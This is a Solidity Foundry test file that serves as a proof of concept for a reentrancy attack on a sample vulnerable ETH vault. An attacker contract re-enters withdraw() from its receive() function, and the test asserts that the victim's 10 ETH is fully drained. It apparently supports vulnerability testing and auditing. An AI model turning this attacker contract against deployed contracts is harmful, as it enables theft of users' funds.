// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../examples/sample_vulnerable_vault.sol";

contract AttackContract {
    VulnerableEthVault public immutable vault;
    constructor(address payable _vault) { vault = VulnerableEthVault(_vault); }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}

contract POC_RED001 is Test {
    VulnerableEthVault internal vault;
    AttackContract internal attackerContract;
    address internal victim = address(0x100);
    address internal attacker = address(0x200);

    function setUp() public {
        vault = new VulnerableEthVault();
        attackerContract = new AttackContract(payable(address(vault)));

        // Fund victim and deposit 10 ETH
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Fund attacker with 2 ETH
        vm.deal(attacker, 2 ether);
    }

    function test_Exploit_VaultReentrancyDrain() public {
        uint256 vaultInitialBalance = address(vault).balance;
        assertEq(vaultInitialBalance, 10 ether);

        // Attacker triggers reentrant exploit with 1 ETH
        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();

        // Vault is completely drained by recursive reentrancy
        assertEq(address(vault).balance, 0, "Vault was not drained");
        assertGe(address(attackerContract).balance, 11 ether, "Attacker did not receive stolen funds");
    }
}